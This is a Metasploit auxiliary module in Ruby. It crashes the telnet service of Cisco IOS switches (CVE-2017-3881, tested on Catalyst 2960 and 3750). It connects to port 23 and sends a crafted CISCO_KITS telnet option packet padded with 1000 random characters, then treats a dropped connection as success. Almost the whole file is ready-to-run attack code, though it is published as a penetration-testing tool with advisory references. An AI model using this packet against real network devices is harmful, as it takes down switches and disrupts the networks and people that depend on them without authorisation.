##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco IOS Telnet Denial of Service',
      'Description'    => %q{
        This module triggers a Denial of Service condition in the Cisco IOS
        telnet service affecting multiple Cisco switches. Tested against Cisco
        Catalyst 2960 and 3750.
      },
      'Author'      => [ 'Artem Kondratenko' ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['BID', '96960'],
          ['CVE', '2017-3881'],
          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp'],
          ['URL', 'https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution']
        ],
      'DisclosureDate' => 'Mar 17 2017'))

    register_options([ Opt::RPORT(23) ])
  end

  def run
    begin
      connect
      print_status "Connected to telnet service"
      packet = sock.read(200)
      if packet.nil?
        print_error "Failed to get initial packet from telnet service."
      else
        print_status "Got initial packet from telnet service: " + packet.inspect
      end
      print_status "Sending Telnet DoS packet"
      sock.put("\xff\xfa\x24\x00\x03CISCO_KITS\x012:" + Rex::Text.rand_text_alpha(1000) + ":1:\xff\xf0")
      disconnect
    rescue ::Rex::ConnectionRefused
      print_status "Unable to connect to #{rhost}:#{rport}."
    rescue ::Errno::ECONNRESET
      print_good "DoS packet successful. #{rhost} not responding."
    end
  end
end
